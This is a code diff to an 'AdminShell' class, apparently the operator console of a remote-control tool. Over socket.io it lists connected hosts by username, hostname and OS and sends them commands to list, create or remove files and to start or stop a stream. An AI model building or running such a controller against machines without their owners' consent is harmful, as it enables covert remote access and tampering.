@@ -35,6 +35,11 @@ class AdminShell:
         self.current_shell = None
         self.console = Console()
 
+        @self.sio_client.on('response')
+        def on_response(res):
+            self.console.print(res["data"])
+            self.condition_responded = True
+
     def run(self):
         self.sio_client.connect(self.host)
         self.sio_client.emit("get_data", callback=self.on_data)
@@ -75,8 +80,27 @@ class AdminShell:
 
         if cli_spl[0] == "help":
             self.console.print(SHELL_HELP)
+        elif cli_spl[0] == "mkdir":
+            self.send_command({"event": "mkdir", "path": cli_spl[1]})
+        elif cli_spl[0] == "listdir":
+            self.send_command({"event": "listdir", "path": cli_spl[1]})
+        elif cli_spl[0] == "remove":
+            self.send_command({"event": "remove", "path": cli_spl[1]})
+        elif cli_spl[0] == "start_stream":
+            self.send_command({"event": "start_stream"})
+        elif cli_spl[0] == "kill_stream":
+            self.send_command({"event": "kill_stream"})
+        elif cli_spl[0] == "cwd":
+            self.send_command({"event": "cwd"})
+        elif cli_spl[0] == "install_dir":
+            self.send_command({"event": "install_dir"})
         else:
             self.print_error_msg("Invalid command")
+
+    def send_command(self, data):
+        self.condition_responded = False
+        self.sio_client.emit("command", {**data, "id": self.current_shell})
+        self.sync_responded()
 
     def set_current_shell(self, index):
         self.current_shell = index
@@ -100,8 +124,8 @@ class AdminShell:
         client_table.add_column("Hostname", style="magenta")
         client_table.add_column("OS", justify="left", style="green")
 
-        for index, client in enumerate(self.clients):
-            client_table.add_row(str(index + 1), client["username"], client["hostname"], client["os"])
+        for client in self.clients:
+            client_table.add_row(str(client["id"]), client["username"], client["hostname"], client["os"])
 
         self.console.print(client_table)
 
